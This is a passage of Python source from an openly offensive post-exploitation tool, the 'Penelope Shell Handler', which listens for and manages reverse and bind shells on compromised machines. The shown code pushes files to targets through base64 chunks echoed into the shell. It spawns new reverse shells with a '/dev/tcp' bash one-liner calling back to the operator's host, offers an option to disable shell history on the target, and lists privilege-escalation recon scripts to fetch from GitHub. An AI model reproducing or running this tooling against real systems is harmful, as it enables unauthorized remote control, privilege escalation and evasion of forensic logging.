				tar.extractall(local_download_folder)
				downloaded=[local_download_folder/item for item in items]

				specified=set()
				for glob in remote_globs:
					specified.update(set(local_download_folder.glob(glob.lstrip('/'))))
				specified=specified.intersection(downloaded)

				for item in specified:
					logger.info(f"Successful download! {paint(pathlink(item),'DIM','yellow')}")

				return specified

			except Exception as e:
				print(e)
				logger.error("Corrupted response")
				return []

		elif self.OS == 'Windows':
			logger.warning("Download on Windows shells is not implemented yet")

	def upload(self, local_item_path):
		if self.OS == 'Unix':

			local_item_path=os.path.expanduser(local_item_path)
			data=io.BytesIO()
			tar=tarfile.open(mode='w:gz',fileobj=data)

			if local_item_path.startswith('http'):
				items=[urlopen(local_item_path, timeout=options.SHORT_TIMEOUT).read()]

			elif local_item_path.startswith(os.path.sep):
				items=list(Path(os.path.sep).glob(local_item_path.lstrip(os.path.sep)))
			else:
				items=list(Path().glob(local_item_path))

			if not items:
				logger.warning(f"Not found: ({local_item_path})")
				return False

			altnames=[]
			for item in items:

				if isinstance(item,bytes):
					name=Path(local_item_path.split('/')[-1])
					altname=f"{name.stem}-{rand()}{name.suffix}"

					file=tarfile.TarInfo(name=altname)
					file.size=len(item)

					tar.addfile(file,io.BytesIO(item))

				else:
					altname=f"{item.stem}-{rand()}{item.suffix}"
					tar.add(item,arcname=altname)

				altnames.append(altname)
				logger.debug(f"Added {altname} to archive")

			tar.close()

			data=base64.b64encode(data.getvalue())

			temp='/tmp/'+rand()
			for chunk in chunks(data.decode(),options.upload_chunk_size):
				self.exec(f"echo -n {chunk} >> {temp}",raw=False)

			cmd=f"base64 -d {temp} | tar xz 2>&1"
			response=self.exec(cmd,raw=False)

			if not response:
				for item in altnames:
					logger.info(f"Successful upload! {paint('('+str(item)+')','DIM','yellow')}")
			else:
				logger.error(f"Upload failed => {response.decode()}")

			self.exec(f"rm {temp}",raw=False)

		elif self.OS == 'Windows':
			logger.warning("Upload on Windows shells is not implemented yet")

	def spawn(self):
		if self.OS == "Unix":
			if self.listener:
				host,port=self.socket.getsockname()
				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
				# bash -i doesn't always work
				cmd=f'bash -c "/bin/bash >& /dev/tcp/{host}/{port} 0>&1 &"'
				if options.no_bash:
					cmd=cmd.replace('bash',rand())
				#timeout=None if self.interactive else self.latency
				response=self.exec(cmd)#,timeout=timeout)
				if response.startswith(b'sh: '):
					logger.error("Bash does not exist on target. Cannot spawn reverse shell...")
			else:
				host,port=self.socket.getpeername()
				logger.info(f"Attempting to spawn a bind shell from {host}:{port}")
				Connect(host,port)

		elif self.OS == 'Windows':
			logger.warning("Spawn Windows shells is not implemented yet")

	def kill(self):

		self.control << b'stop'

		if hasattr(menu,'sid') and hasattr(self,'id') and menu.sid==self.id:
			menu.set_id(None)

		self.lock.acquire()

		if hasattr(self,'logfile'):
			self.logfile.close()

		try:
			del core.sessions[self.id]
			core.checkables.discard(self)

			self.socket.shutdown(socket.SHUT_RDWR)

		except OSError: # The socket is already closed
			pass

		except (KeyError, AttributeError):
			# The shutdown happened before object creation completed
			self.is_invalid=True
		finally:
			self.socket.close()
			self.lock.release()
			if not hasattr(self,'is_invalid'):
				logger.error(f"{paint(self.name,'RED','white')}"
				f"{paint('','red',reset=False)} disconnected 💔\r")

	def exit(self):
		self.kill()
		if self.is_attached:
			self.detach(killed=True)


class Interfaces:

	def __str__(self):
		_list=[]
		for name,ip in self.list.items():
			_list.append(f"{paint(name,'cyan')}{paint(':','magenta')}{paint(ip,'yellow')}")
		return '\n'.join(_list)

	def oneLine(self):
		return '('+str(self).replace('\n','|')+')'

	def translate(self, iface_ip):
		if iface_ip in self.list:
			return self.list[iface_ip]
		elif iface_ip == 'any':
			return '0.0.0.0'
		else:
			return iface_ip

	@property
	def list(self):
		if OS == 'Linux':
			output=subprocess.check_output(['ip','a']).decode()
			interfaces=re.findall(r'(?m)(?<=^ {4}inet )([^ /]*).* ([^ ]*)$',output)
			return {i[1]:i[0] for i in interfaces}

		elif OS == 'Darwin':
			_list=dict()
			output=re.sub('\n\s',' ',subprocess.check_output(['ifconfig']).decode())
			for line in output.splitlines():
				if result:=re.search('^([^:]*).*inet ([^ ]*)',line):
					_list[result[1]]=result[2]
			return _list

	@property
	def list_all(self):
		return [item for item in list(self.list.keys())+list(self.list.values())]

class Color:
	colors=('black', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white')
	codes={'RESET':0, 'BRIGHT':1, 'DIM':2, 'UNDERLINE':4, 'BLINK':5, 'NORMAL':22}
	escape=lambda codes: f"\x1b[{codes}m"

	def __init__(self):
		__class__.codes.update({color:code for code,color in enumerate(__class__.colors,30)})
		__class__.codes.update({color.upper():code for code,color in enumerate(__class__.colors,40)})

	def __call__(self, text, *colors, reset=True):
		code_sequence=';'.join([str(__class__.codes[color]) for color in colors])
		prefix=__class__.escape(code_sequence) if code_sequence else ''
		suffix=__class__.escape(__class__.codes['RESET']) if prefix and reset else ''
		return f"{prefix}{text}{suffix}"

class CustomFormatter(logging.Formatter):
	TEMPLATES={
		logging.CRITICAL:	{'color':"RED",	'prefix':'[!!!]'},
		logging.ERROR:		{'color':"red",	'prefix':'[-]'},
		logging.WARNING:	{'color':"yellow",	'prefix':'[!]'},
		logging.INFO:		{'color':"green",	'prefix':'[+]'},
		logging.DEBUG:		{'color':"magenta",	'prefix':'[---DEBUG---]'}
	}
	def format(self, record):
		template=__class__.TEMPLATES[record.levelno]
		if core.attached_session is not None: print()
		text = f"\r{template['prefix']} {logging.Formatter.format(self,record)}"
		return paint(text,template['color'])


def ControlC(num, stack):
	if core.attached_session:
		core.attached_session.detach()

	elif "Menu" in core.threads:
		#os.write(sys.stdout.fileno(),b'^C\n')
		#os.write(sys.stdout.fileno(),menu.prompt.encode())
		if menu.sid:
			core.sessions[menu.sid].control << b'stop'
	else:
		core.stop()


class Options:
	log_levels={"silent":logging.WARNING,"extra_silent":logging.CRITICAL,"debug":logging.DEBUG}

	def __setattr__(self, name, value):
		if level:=__class__.log_levels.get(name):
			level=level if value else logging.INFO
			logging.getLogger(__program__).setLevel(level)
		self.__dict__[name] = value

options=Options()

# OPTIONS
parser=argparse.ArgumentParser(description="Penelope Shell Handler", add_help=False)

parser.add_argument("PORT", nargs='?', help="Port to listen/connect to depending on -i/-c options. Default: 4444", default=4444)

method=parser.add_argument_group("Reverse or Bind shell?")
method.add_argument("-i", "--address", help="IP Address or Interface to listen on. Default: 0.0.0.0", default="0.0.0.0",metavar='')
method.add_argument("-c", "--connect", help="Bind shell Host",metavar='')

hints=parser.add_argument_group("Hints")
hints.add_argument("-a", "--hints", help="Show sample payloads for reverse shell based on the registered listeners", action="store_true")
hints.add_argument("-l", "--interfaces", help="Show the available network interfaces",action="store_true")
hints.add_argument("-h", "--help", action="help", help="show this help message and exit")

verbosity=parser.add_argument_group("Verbosity")
verbosity.add_argument("-Q", "--silent", help="Show only errors and warnings", action="store_true")
verbosity.add_argument("-X", "--extra-silent", help="Suppress all logging messages", action="store_true")

log=parser.add_argument_group("Logging")
log.add_argument("-L", "--no-log", help="Do not create session log files", action="store_true")
log.add_argument("-T", "--no-timestamps", help="Do not include timestamps on logs", action="store_true")

misc=parser.add_argument_group("Misc")
misc.add_argument("-H", "--no-history", help="Disable shell history on target", action="store_true")
misc.add_argument("-P", "--plain", help="Just land to the menu", action="store_true")
misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
misc.add_argument("-C", "--no-attach", help="Disable auto attaching sessions upon creation", action="store_true")
misc.add_argument("-U", "--no-upgrade", help="Do not upgrade shells", action="store_true")

debug=parser.add_argument_group("Debug")
debug.add_argument("-d", "--debug", help="Show debug messages", action="store_true")
debug.add_argument("-NP", "--no-python", help="Simulate python absence on target", action="store_true")
debug.add_argument("-NB", "--no-bash", help="Simulate bash absence on target", action="store_true")

args=[] if not __name__=="__main__" else None
parser.parse_args(args,options)

# SEMICONSTANT OPTIONS
options.ESCAPE=b'\x1b\x5b\x32\x34\x7e' # F12
options.LONG_TIMEOUT=60
options.SHORT_TIMEOUT=5
options.LATENCY=.01
options.max_open_files=5
options.upload_chunk_size=40960
options.BASEDIR=Path.home()/f'.{__program__}'
options.cmd_histfile=options.BASEDIR/'cmd_history.log'
options.debug_histfile=options.BASEDIR/'cmd_debug.log'
options.histlength=1000

# EXTRAS
options.recon_scripts={
'Unix':[
	'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh',
	'https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh'
],
'Windows':[
	'https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'
]}

# CONSTANTS
OSes={'Unix':'🐧','Windows':'💻'}
OS=platform.system()
TTY_NORMAL=termios.tcgetattr(sys.stdin)

pathlink = lambda filepath: (f'\x1b]8;;file://{filepath.parents[0]}\x07{filepath.parents[0]}'
				f'/\x1b]8;;\x07\x1b]8;;file://{filepath}\x07{filepath.name}\x1b]8;;\x07')

Open = lambda item: subprocess.Popen(({'Linux':'xdg-open','Darwin':'open'}\
	[OS],item),stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

rand = lambda: ''.join(random.choice(string.ascii_letters) for i in range(8))

chunks = lambda string,length:(string[0+i:length+i] for i in range(0, len(string), length))

# INIT
paint=Color()
menu=MainMenu()
menu.set_id(None)
core=Core()
signal.signal(signal.SIGINT,ControlC)
options.BASEDIR.mkdir(parents=True,exist_ok=True)

# LOGGING
logger=logging.getLogger(__program__)
cmdlogger=logging.getLogger(f"{__program__}_cmd")

stdout_handler=logging.StreamHandler()
stdout_handler.setFormatter(CustomFormatter())

file_handler=logging.FileHandler(options.BASEDIR/f"{__program__}.log")
file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))

logger.addHandler(stdout_handler)
logger.addHandler(file_handler)
cmdlogger.addHandler(stdout_handler)
cmdlogger.addHandler(file_handler)

# MAIN
if __name__=="__main__":
	if options.interfaces:
		print(Interfaces())
	elif options.plain:
		menu.show()
	elif options.connect:
		Connect(options.connect,options.PORT)
	else:
		Listener()
